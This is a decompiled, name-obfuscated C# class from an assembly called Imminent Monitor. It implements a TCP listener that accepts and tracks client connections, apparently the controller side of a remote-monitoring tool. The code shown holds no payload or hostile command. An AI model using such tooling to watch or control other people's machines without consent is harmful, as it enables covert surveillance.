// Decompiled with JetBrains decompiler
// Type: GClass27
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;

public sealed class GClass27
{
  private GClass27.GDelegate9 gdelegate9_0;
  private GClass27.GDelegate10 gdelegate10_0;
  private Socket socket_0;
  public GClass16 gclass16_0;
  private readonly List<GClass16> list_0;
  public GClass18 gclass18_0;

  public GClass27() => this.list_0 = new List<GClass16>();

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(GClass27.GDelegate9 gdelegate9_1) => this.gdelegate9_0 += gdelegate9_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(GClass27.GDelegate9 gdelegate9_1) => this.gdelegate9_0 -= gdelegate9_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_2(GClass27.GDelegate10 gdelegate10_1) => this.gdelegate10_0 += gdelegate10_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_3(GClass27.GDelegate10 gdelegate10_1) => this.gdelegate10_0 -= gdelegate10_1;

  public GClass16[] method_4()
  {
    lock (this.list_0)
      return this.list_0.ToArray();
  }

  public GClass16[] method_5()
  {
    lock (this.list_0)
    {
      List<GClass16> gclass16List = new List<GClass16>();
      int num = this.list_0.Count - 1;
      for (int index = 0; index <= num; ++index)
      {
        if (this.list_0[index].bool_2)
          gclass16List.Add(this.list_0[index]);
      }
      return gclass16List.ToArray();
    }
  }

  public void method_6(GClass18 gclass18_1, string string_0, int int_0)
  {
    this.method_8();
    this.gclass18_0 = gclass18_1;
    this.gclass18_0.method_20().gclass27_0 = this;
    this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    this.socket_0.Bind((EndPoint) new IPEndPoint(IPAddress.Parse(string_0), int_0));
    this.socket_0.Listen(100);
    this.socket_0.BeginAccept(new AsyncCallback(this.method_7), (object) null);
  }

  private void method_7(IAsyncResult iasyncResult_0)
  {
    try
    {
      lock (this.list_0)
        this.list_0.Add(new GClass16(this.gclass18_0, this.socket_0.EndAccept(iasyncResult_0), this));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      this.socket_0.BeginAccept(new AsyncCallback(this.method_7), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_8()
  {
    if (this.socket_0 != null)
      this.socket_0.Close();
    lock (this.list_0)
    {
      try
      {
        foreach (GClass16 gclass16 in new List<GClass16>((IEnumerable<GClass16>) this.list_0))
          gclass16.method_16();
      }
      finally
      {
        List<GClass16>.Enumerator enumerator;
        enumerator.Dispose();
      }
      this.list_0.Clear();
    }
  }

  public GClass16 method_9(int int_0)
  {
    GClass27.Class142 class142 = new GClass27.Class142();
    class142.int_0 = int_0;
    lock (this.list_0)
      return this.list_0.FirstOrDefault<GClass16>(new Func<GClass16, bool>(class142._Lambda\u0024__133));
  }

  internal void method_10(GClass16 gclass16_1)
  {
    try
    {
      GClass27.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 == null)
        return;
      gdelegate90(gclass16_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  internal void method_11(GClass16 gclass16_1)
  {
    try
    {
      if (!gclass16_1.method_12())
      {
        lock (this.list_0)
        {
          int num = this.list_0.Count - 1;
          for (int index = 0; index <= num; ++index)
          {
            if (this.list_0[index].method_14() == gclass16_1.method_14())
            {
              this.list_0.RemoveAt(index);
              break;
            }
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      GClass27.GDelegate10 gdelegate100 = this.gdelegate10_0;
      if (gdelegate100 == null)
        return;
      gdelegate100(gclass16_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  internal sealed class Class142
  {
    public int int_0;

    [CompilerGenerated]
    [SpecialName]
    public bool _Lambda\u0024__133(GClass16 gclass16_0) => gclass16_0.method_14() == this.int_0;
  }

  public delegate void GDelegate9(GClass16 gclass16_0);

  public delegate void GDelegate10(GClass16 gclass16_0);
}
